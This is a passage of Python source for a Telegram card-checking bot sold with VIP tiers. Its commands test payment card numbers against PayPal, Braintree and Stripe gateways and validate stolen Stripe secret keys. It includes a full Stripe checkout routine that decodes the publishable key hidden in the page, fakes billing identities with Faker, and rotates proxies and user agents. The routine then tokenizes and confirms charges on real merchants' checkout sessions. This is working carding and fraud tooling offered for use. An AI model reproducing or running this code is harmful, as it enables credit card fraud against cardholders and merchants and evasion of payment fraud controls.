        "  🛡️ /vbvm » Braintree 3DS Mass  <i>└ up to 50 cards</i>\n"
        "  ⚡ /st   » Stripe Charge  <i>└ direct · ultra fast</i>\n"
        "  🔐 /sa   » Stripe Auth Only  <i>└ no charge</i>\n"
        "  🚀 /stm  » Stripe Mass  <i>└ multiple cards</i>\n"
        "  🌐 /co   » Stripe Checkout  ✦ 4-in-1  <i>(direct · no server)</i>\n"
        "     <i>└ single card · multi cards · BIN gen · reply .txt</i>\n"
        "  🔗 /xco  » Ext API Checkout  ✦ 4-in-1  <i>(ext API)</i>\n"
        "     <i>└ single card · multi cards · BIN gen · reply .txt</i>\n"
        "  🎯 /h    » Hitter Checker  ✦ 4-in-1  <i>(gold-newt hitter.php)</i>\n"
        "     <i>└ single card · multi cards · reply .txt · reply gen msg</i>\n"
        "  🔥 /ah   » Auto Hitter  ✦ 4-in-1  <i>(hitter1month · checkout/invoice/billing)</i>\n"
        "     <i>└ single card · multi cards · reply .txt · reply gen msg · session cache</i>\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        f"🔑 ──[ SK CHECKERS  {lock} VIP ]── 🔑\n"
        "  🗝️ /sk    » SK Single  <i>└ /sk sk_live_xxx  card</i>\n"
        "  📦 /skm   » SK Mass  <i>└ /skm sk_live_xxx  cards</i>\n"
        "  ✅ /skchk » SK Inspector  <i>└ balance · charges</i>\n"
        "  🔎 /msk   » Mass SK Keys  <i>└ up to 30 keys</i>\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        "🃏 ──[ CARD & BIN TOOLS  🆓 FREE ]── 🃏\n"
        "  🎰 /gen   » Generator  <i>└ /gen 411111 [count]</i>\n"
        "  🔎 /bin   » BIN Lookup  <i>└ brand · bank · country</i>\n"
        "  ✅ /thik  » CC Aligner  <i>└ raw list → num|mm|yy|cvv · reply or inline</i>\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        "🌐 ──[ PROXY TOOLS  🆓 FREE ]── 🌐\n"
        "  ➕ /addproxy   » Set Proxy  <i>└ ip:port · user:pass@ip:port</i>\n"
        "  ➖ /removeproxy » Remove  ✅ /proxycheck » Test\n"
        "  🕷️ /scr  » Scrape  <i>└ FREE:50 · VIP:500</i>\n"
        "  ⚡ /chkpxy » Bulk Check  <i>└ 10 threads · max 500</i>\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        "📊 ──[ INFO  🆓 FREE ]── 📊\n"
        "  📜 /history » Last 10 Checks\n"
        "  📡 /ping » Latency  🆔 /myid » Your ID\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        f"⚙️ ──[ SETTINGS ]── ⚙️\n"
        f"  💵 /setamount » Amount  <i>└ now ${current_amount} · /setamount 5.00</i>\n"
        f"  🔑 /setsk  » Set SK {lock}  👁️ /mysk » View {lock}  🗑️ /delsk » Del {lock}\n"
        f"{admin_section}\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        "         ⌤ Dev by @yadistan 🍀</b>"
    )

    bot.send_message(chat_id=message.chat.id, text=gw_msg, parse_mode='HTML', reply_markup=keyboard)

@bot.message_handler(commands=["pp"])
def paypal_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open("data.json", 'w', encoding='utf-8') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        card = _get_card_from_message(message)
        if not card:
            current_amount = get_user_amount(id)
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/pp 4111111111111111|12|25|123\n\n💰 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current_amount}\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        log_command(message, query_type='gateway', gateway='paypal')
        user_amount = get_user_amount(id)
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = paypal_gate(card, user_amount, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'paypal', result, exec_time=execution_time)
        
        if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in result:
            status_emoji = "✅"
        elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in result:
            status_emoji = "💰"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#pp_Gateway ${user_amount} 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Passed Command (/vbv) ==================
@bot.message_handler(commands=["vbv"])
def passed_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/wan_ef")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open("data.json", 'w', encoding='utf-8') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/vbv 4111111111111111|12|25|123\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        log_command(message, query_type='gateway', gateway='vbv')
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $2.99</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        proxy = get_proxy_dict(id)
        result = passed_gate(card, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'vbv', result, exec_time=execution_time)
        
        if "3DS Authenticate Attempt Successful" in result:
            status_emoji = "✅"
        elif "3DS Challenge Required" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#passed_Gateway $2.99 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: $2.99
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Charge Command ==================
@bot.message_handler(commands=["st"])
def stripe_charge_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/st 4111111111111111|12|25|123\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        log_command(message, query_type='gateway', gateway='stripe_charge')
        proxy = get_proxy_dict(id)
        user_sk = get_user_sk(id)

        if user_sk:
            sk_masked = f"{user_sk[:12]}...***"
            msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘄𝗶𝘁𝗵 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗞𝗲𝘆... ⏳\n🔑 𝗞𝗲𝘆: <code>{sk_masked}</code></b>")
        else:
            msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: $1.00</b>")

        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        start_time = time.time()
        if user_sk:
            result = stripe_sk_check(card, user_sk, proxy)
            gateway_label = "stripe_sk"
            header_label = f"#SK_Auth 🔑"
            amount_label = "$0.01 Auth"
        else:
            result = stripe_charge(card, proxy)
            gateway_label = "stripe_charge"
            header_label = "#stripe_charge $1.00 🔥"
            amount_label = "$1.00"
        execution_time = time.time() - start_time
        log_card_check(id, card, gateway_label, result, exec_time=execution_time)

        if any(x in result for x in ("Charge !!", "Approved", "Auth", "Charged", "Successful")):
            status_emoji = "✅"
        elif "Insufficient" in result or "3DS" in result:
            status_emoji = "💰"
        else:
            status_emoji = "❌"

        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
        minux_keyboard.add(minux_button)

        formatted_message = f"""<b>{header_label}
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: {amount_label}
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"""

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Checkout Function ==================
def _parse_stripe_error(error):
    decline_code = error.get('decline_code', '')
    err_code = error.get('code', '')
    err_msg = error.get('message', 'Unknown')

    DECLINE_MAP = {
        'insufficient_funds': 'Insufficient Funds',
        'card_velocity_exceeded': 'Velocity Exceeded',
        'do_not_honor': 'Do Not Honor',
        'generic_decline': 'Generic Decline',
        'lost_card': 'Lost Card',
        'stolen_card': 'Stolen Card',
        'pickup_card': 'Pickup Card',
        'expired_card': 'Card Expired',
        'incorrect_cvc': 'Incorrect CVC',
        'incorrect_number': 'Incorrect Number',
        'invalid_account': 'Invalid Account',
        'fraudulent': 'Flagged as Fraud',
        'transaction_not_allowed': 'Transaction Not Allowed',
        'try_again_later': 'Try Again Later',
        'withdrawal_count_limit_exceeded': 'Withdrawal Limit',
        'not_permitted': 'Not Permitted',
        'restricted_card': 'Restricted Card',
        'security_violation': 'Security Violation',
        'service_not_allowed': 'Service Not Allowed',
        'stop_payment_order': 'Stop Payment',
        'testmode_decline': 'Test Card',
        'no_action_taken': 'No Action Taken',
        'revocation_of_authorization': 'Auth Revoked',
        'blocked': 'Blocked',
    }
    ERR_CODE_MAP = {
        'card_declined': 'Card Declined',
        'expired_card': 'Card Expired',
        'incorrect_cvc': 'Incorrect CVC',
        'invalid_cvc': 'Invalid CVC',
        'incorrect_number': 'Incorrect Number',
        'invalid_number': 'Invalid Number',
        'invalid_expiry_month': 'Invalid Expiry Month',
        'invalid_expiry_year': 'Invalid Expiry Year',
        'authentication_required': '3DS Required (Live Card)',
        'resource_missing': 'Session Expired / Link Used',
        'session_expired': 'Session Expired / Link Used',
        'payment_intent_incompatible_payment_method': 'Session Expired / Link Used',
    }

    if decline_code:
        if decline_code == 'insufficient_funds':
            return 'Insufficient Funds'
        if 'authentication' in decline_code or '3ds' in decline_code:
            return '3DS Required (Live Card)'
        friendly = DECLINE_MAP.get(decline_code)
        if friendly:
            return friendly
        return f"Declined - {decline_code.replace('_', ' ').title()}"

    if err_code:
        if 'authentication' in err_code or 'action_required' in err_code:
            return '3DS Required (Live Card)'
        friendly = ERR_CODE_MAP.get(err_code)
        if friendly:
            return friendly
        return f"Declined - {err_code.replace('_', ' ').title()}"

    ml = err_msg.lower()
    if 'insufficient' in ml:
        return 'Insufficient Funds'
    if 'authentication' in ml or '3d' in ml or 'requires_action' in ml:
        return '3DS Required (Live Card)'
    if 'expired' in ml:
        return 'Card Expired'
    if 'resource' in ml and 'missing' in ml:
        return 'Session Expired / Link Used'
    if 'no such' in ml or 'not found' in ml:
        return 'Session Expired / Link Used'
    return f"Declined - {err_msg[:70]}"


def stripe_checkout(checkout_url, ccx, proxy_dict=None, sk=None):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3].strip()

    if len(ex) == 4 and ex[:2] == '20':
        yy = ex[2:]
    elif len(ex) == 4:
        yy = ex[2:]
    else:
        yy = ex.zfill(2)

    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}{random.randint(1000, 9999)}@gmail.com"
    city = fake.city()
    state = fake.state_abbr()
    zip_code = fake.zipcode()
    address = fake.street_address()

    session = cloudscraper.create_scraper()
    if proxy_dict:
        session.proxies.update(proxy_dict)
    ua = generate_user_agent()

    headers = {
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
    }

    try:
        r1 = session.get(checkout_url, headers=headers, allow_redirects=True, timeout=20)
        final_url = r1.url
        page_text = r1.text

        import base64
        from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

        cs_id = None
        pk_live = None

        # Extract session ID — prefer ppage_ (payment_pages API supports ppage_)
        for src in [final_url, page_text]:
            m = re.search(r'ppage_[A-Za-z0-9_]+', src)
            if m and m.group(0) != 'ppage_DEMO':
                cs_id = m.group(0)
                break
        if not cs_id:
            for src in [final_url, page_text]:
                m = re.search(r'cs_(?:live|test)_[A-Za-z0-9_]+', src)
                if m:
                    cs_id = m.group(0)
                    break

        if not cs_id:
            return "Failed to extract form data"

        # For cs_live_ sessions: decode hash (XOR-5 encoded) to get pk_live
        # Stripe checkout embeds apiKey (pk_live) in the URL hash, XOR-encrypted with key 5
        if cs_id.startswith('cs_'):
            raw_hash = checkout_url.split('#', 1)[1] if '#' in checkout_url else ''
            if not raw_hash:
                # Try from redirected URL
                raw_hash = final_url.split('#', 1)[1] if '#' in final_url else ''
            if raw_hash:
                try:
                    import urllib.parse as _up
                    hash_decoded = _up.unquote(raw_hash)
                    padded = hash_decoded + '=' * ((4 - len(hash_decoded) % 4) % 4)
                    raw_bytes = base64.b64decode(padded)
                    # Try XOR keys 1-15 to find the one that yields valid JSON with pk_live
                    for xor_key in range(1, 16):
                        xored = bytes([b ^ xor_key for b in raw_bytes])
                        try:
                            xored_str = xored.decode('utf-8')
                            if '"apiKey"' in xored_str or '"publishableKey"' in xored_str:
                                import json as _json
                                hash_data = _json.loads(xored_str)
                                pk_live = hash_data.get('apiKey') or hash_data.get('publishableKey')
                                if pk_live and pk_live.startswith('pk_live_'):
                                    break
                                else:
                                    pk_live = None
                        except Exception:
                            continue
                except Exception:
                    pass

        # Fallback: try extracting pk_live from page HTML (works for ppage_ and some older cs_ pages)
        if not pk_live:
            for pat in [
                r'"(?:apiKey|publishableKey|public_key)"\s*:\s*"(pk_live_[A-Za-z0-9]+)"',
                r"'(?:apiKey|publishableKey)'\s*:\s*'(pk_live_[A-Za-z0-9]+)'",
                r'(?:publishableKey|apiKey|stripeKey)[^:=]{0,20}[:=]\s*["\']?(pk_live_[A-Za-z0-9]{20,})',
                r'pk_live_[A-Za-z0-9]{20,}',
            ]:
                m = re.search(pat, page_text)
                if m:
                    pk_live = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                    break

        if not pk_live:
            return "Failed to extract form data"

        # Use actual page origin (custom domain or stripe.com)
        parsed_origin = urlparse(final_url)
        page_origin = f"{parsed_origin.scheme}://{parsed_origin.netloc}"
        page_referer = final_url.split('#')[0]

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': page_origin,
            'referer': page_referer,
            'user-agent': ua,
        }

        pm_data = (
            f'type=card'
            f'&billing_details[name]={first_name}+{last_name}'
            f'&billing_details[email]={email}'
            f'&billing_details[address][line1]={address.replace(" ", "+")}'
            f'&billing_details[address][city]={city.replace(" ", "+")}'
            f'&billing_details[address][state]={state}'
            f'&billing_details[address][postal_code]={zip_code}'
            f'&billing_details[address][country]=US'
            f'&card[number]={c}'
            f'&card[cvc]={cvc}'
            f'&card[exp_month]={mm}'
            f'&card[exp_year]={yy}'
            f'&payment_user_agent=stripe.js%2F419d6f15%3B+stripe-js-v3%2F419d6f15%3B+checkout-mobile'
            f'&time_on_page={random.randint(30000, 120000)}'
            f'&key={pk_live}'
        )

        pm_resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pm_data, timeout=20)
        pm_json = pm_resp.json()

        if 'error' in pm_json:
            return _parse_stripe_error(pm_json['error'])

        pm_id = pm_json.get('id')
        if not pm_id:
            return "Declined - Could not tokenize card"

        # Branch: cs_live_ sessions → requires merchant SK key
        if cs_id.startswith('cs_'):
            if not sk:
                return "CS_NEEDS_SK"

            sk_headers = {
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': ua,
            }

            # Step 1: Fetch checkout session with SK to get payment_intent ID
            cs_resp = session.get(
                f'https://api.stripe.com/v1/checkout/sessions/{cs_id}',
                headers=sk_headers, timeout=15
            )
            cs_data = cs_resp.json()
            if 'error' in cs_data:
                err = cs_data['error']
                err_code = err.get('code', '')
                err_msg  = err.get('message', '').lower()
                if err_code == 'resource_missing' or 'no such' in err_msg:
                    return "Session Expired / Link Used"
                if cs_resp.status_code in (401, 403) or 'invalid api key' in err_msg:
                    return "Invalid SK Key - Check /setsk"
                return _parse_stripe_error(err)

            pi_id = cs_data.get('payment_intent', '')
            if not pi_id:
                # Subscription / setup mode — no immediate PI
                return "CS_GATEWAY_ERROR"

            # Step 2: Fetch PI to get client_secret
            pi_resp = session.get(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
                headers=sk_headers, timeout=15
            )
            pi_data = pi_resp.json()
            if 'error' in pi_data:
                return _parse_stripe_error(pi_data['error'])

            client_secret = pi_data.get('client_secret', '')
            if not client_secret:
                return "Failed to extract form data"

            # Determine confirm endpoint (payment vs setup intent)
            if pi_id.startswith('seti_'):
                confirm_ep = f'https://api.stripe.com/v1/setup_intents/{pi_id}/confirm'
            else:
                confirm_ep = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'

            # Use SK for server-side confirmation (more reliable for checkout sessions)
            confirm_headers = {**stripe_headers, 'Authorization': f'Bearer {sk}'}
            confirm_data = (
                f'payment_method={pm_id}'
                f'&use_stripe_sdk=true'
                f'&return_url={page_referer}'
            )
            confirm_resp = session.post(
                confirm_ep, headers=confirm_headers, data=confirm_data, timeout=20
            )
            confirm_json = confirm_resp.json()

        else:
            # ppage_ sessions: use payment_pages flow
            page_get_resp = session.get(
                f'https://api.stripe.com/v1/payment_pages/{cs_id}?key={pk_live}',
                headers=stripe_headers, timeout=15
            )
            page_get_json = page_get_resp.json()

            if 'error' in page_get_json:
                err = page_get_json['error']
                if err.get('code') == 'resource_missing' or 'no such' in err.get('message', '').lower():
                    return "Session Expired / Link Used"
                return _parse_stripe_error(err)

            confirm_data = (
                f'payment_method={pm_id}'
                f'&expected_payment_method_type=card'
                f'&use_stripe_sdk=true'
                f'&return_url={page_referer}'
                f'&key={pk_live}'
            )
            confirm_resp = session.post(
                f'https://api.stripe.com/v1/payment_pages/{cs_id}/confirm',
                headers=stripe_headers, data=confirm_data, timeout=20
            )
            confirm_json = confirm_resp.json()

        if 'error' in confirm_json:
            return _parse_stripe_error(confirm_json['error'])

        status = confirm_json.get('status', '')
        if status in ('succeeded', 'complete', 'paid'):
            amount = confirm_json.get('amount', confirm_json.get('amount_total', 0))
            currency = confirm_json.get('currency', 'usd').upper()
            if amount:
                return f"Charged {currency} {int(amount)/100:.2f}"
            return "Checkout Successful"
        elif status == 'requires_action' or confirm_json.get('next_action'):
            return "3DS Required (Live Card)"
        elif status == 'processing':
            return "Processing (Live)"
        elif status == 'requires_payment_method':
            pi_err = confirm_json.get('last_payment_error', {})
            if pi_err:
                return _parse_stripe_error(pi_err)
            return "Card Declined"
        else:
            if confirm_json.get('next_action'):
                return "3DS Required (Live Card)"
            return f"Declined - {status}" if status else "Card Declined"

    except requests.exceptions.Timeout:
        return "Error: Timeout"
    except Exception as e:
        return f"Error: {str(e)[:80]}"

# ================== Stripe Mass Command ==================
@bot.message_handler(commands=["stm"])
def stripe_mass_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/stm card1\ncard2\ncard3\n\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n/stm 4111111111111111|12|25|123\n5200000000000007|06|26|456\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        
        stop_keyboard = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop')
        stop_keyboard.add(stop_button)
        
        msg = bot.reply_to(message, f"<b>⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_keyboard)
        
        live = 0
        dead = 0
        insufficient = 0
        checked = 0
        results_lines = []
        
        def build_mass_message(status_text="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
